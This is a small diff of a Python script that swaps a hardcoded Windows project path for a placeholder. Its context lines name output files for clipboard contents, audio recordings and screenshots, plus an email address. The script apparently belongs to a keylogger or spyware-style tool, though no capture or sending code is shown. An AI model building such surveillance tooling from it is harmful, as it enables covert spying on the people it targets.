@@ -36,7 +36,7 @@ clipboard_information = "clipboard.txt"
 audio_information = "audio.wav"
 screenshot_information = "screenshot.png"
 
-file_path = "C:\\Users\\ASUS\\PycharmProjects\\pythonProject\\Project"
+file_path = "your files path"
 extend = "\\"
 
 email_address = "enter_your_email"  # Replace with your email address
